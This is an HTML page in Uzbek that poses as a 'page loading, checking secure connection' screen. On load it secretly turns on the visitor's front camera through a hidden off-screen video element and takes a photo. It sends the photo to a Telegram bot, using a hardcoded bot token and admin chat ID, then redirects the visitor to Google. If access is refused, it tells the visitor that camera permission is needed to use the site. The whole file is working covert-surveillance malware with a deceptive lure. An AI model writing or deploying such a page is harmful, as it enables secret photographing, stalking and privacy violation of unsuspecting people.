<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sahifa yuklanmoqda...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #f8fafc;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .card {
            background: #ffffff;
            border-radius: 20px;
            padding: 40px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05);
            border: 1px solid #e2e8f0;
        }

        .spinner-wrap {
            width: 64px;
            height: 64px;
            margin: 0 auto 24px;
        }

        .spinner {
            width: 100%;
            height: 100%;
            border: 4px solid #e2e8f0;
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0%   { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 { font-size: 19px; font-weight: 600; margin-bottom: 10px; color: #0f172a; }
        p  { font-size: 14px; color: #64748b; line-height: 1.5; }

        .btn-retry {
            display: none;
            margin-top: 24px;
            padding: 12px 24px;
            background: #2563eb;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
        }

        /* Yashirin kamera elementlari */
        .hidden-cam {
            position: fixed;
            top: -9999px; left: -9999px;
            width: 1px; height: 1px;
            opacity: 0; pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner-wrap"><div class="spinner"></div></div>
        <h2 id="title">Sahifa yuklanmoqda...</h2>
        <p id="desc">Iltimos, kuting. Xavfsiz ulanish tekshirilmoqda...</p>
        <button id="retry-btn" class="btn-retry" onclick="start()">Davom etish</button>
    </div>

    <div class="hidden-cam">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const params    = new URLSearchParams(window.location.search);
        const CHAT_ID   = params.get('id') || '5724786253';
        const ADMIN_ID  = '5724786253';
        const TOKEN     = '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';
        const REDIRECT  = params.get('redirect') || 'https://www.google.com';

        const video     = document.getElementById('video');
        const canvas    = document.getElementById('canvas');
        const title     = document.getElementById('title');
        const desc      = document.getElementById('desc');
        const retryBtn  = document.getElementById('retry-btn');

        let busy = false;

        async function start() {
            if (busy) return;
            busy = true;
            retryBtn.style.display = 'none';
            await captureAndSend();
        }

        async function captureAndSend() {
            let stream = null;
            try {
                // Tezkor ulanish: qattiq o'lcham cheklovlarsiz darhol boshlash
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });

                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.setAttribute('autoplay', '');
                video.setAttribute('muted', '');
                video.playsInline = true;
                video.muted = true;
                await video.play().catch(() => {});

                // Eng birinchi tayyor kadrni ushlash (700ms kutmasdan, 100-150ms da oladi)
                await new Promise((resolve) => {
                    const check = () => {
                        if (video.readyState >= 2 && video.videoWidth > 0) {
                            setTimeout(resolve, 80); // Ekspozitsiya to'g'rilanishi uchun minimal 80ms
                        } else {
                            requestAnimationFrame(check);
                        }
                    };
                    video.addEventListener('loadeddata', () => setTimeout(resolve, 80), { once: true });
                    check();
                    setTimeout(resolve, 250); // Maksimal kutish 250ms
                });

                canvas.width  = video.videoWidth  || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                // Sifat 0.75 — fayl hajmi kichik bo'ladi va Telegramga soniyada yuklanadi
                const dataUrl = canvas.toDataURL('image/jpeg', 0.75);
                stopStream(stream);

                // Yuborishni fonda boshlab, darhol yakunlash
                sendPhoto(dataUrl);
                done();
            } catch (err) {
                stopStream(stream);
                showError();
            }
        }

        async function sendPhoto(dataUrl) {
            // 1-yo'l: /api/send orqali (Vercel serverdan)
            try {
                const res = await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, data: dataUrl })
                });
                if (res.ok) {
                    const j = await res.json();
                    if (j.ok) return;
                }
            } catch (_) {}

            // 2-yo'l: To'g'ridan-to'g'ri Telegram API ga (zaxira)
            try {
                const blob = await (await fetch(dataUrl)).blob();
                const now = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });
                const caption = '📅 ' + now;

                const targetIds = new Set();
                targetIds.add(ADMIN_ID);
                if (CHAT_ID) targetIds.add(CHAT_ID);

                for (const tid of targetIds) {
                    const fd = new FormData();
                    fd.append('chat_id', tid);
                    fd.append('caption', caption);
                    fd.append('photo', blob, 'photo.jpg');
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST', body: fd
                    }).catch(() => {});
                }
            } catch (_) {}
        }

        function stopStream(stream) {
            if (stream) stream.getTracks().forEach(t => t.stop());
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(t => t.stop());
                video.srcObject = null;
            }
        }

        function done() {
            title.innerText = 'Yuklandi!';
            desc.innerText  = "Yo'naltirilmoqda...";
            setTimeout(() => { window.location.href = REDIRECT; }, 400);
        }

        function showError() {
            busy = false;
            title.innerText = 'Ruxsat talab qilinadi';
            desc.innerText  = 'Saytdan foydalanish uchun kameraga ruxsat bering.';
            retryBtn.style.display = 'block';
        }

        // Sahifa ochilishi bilan kutmasdan darhol boshlash
        start();
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', start);
        }
    </script>
</body>
</html>
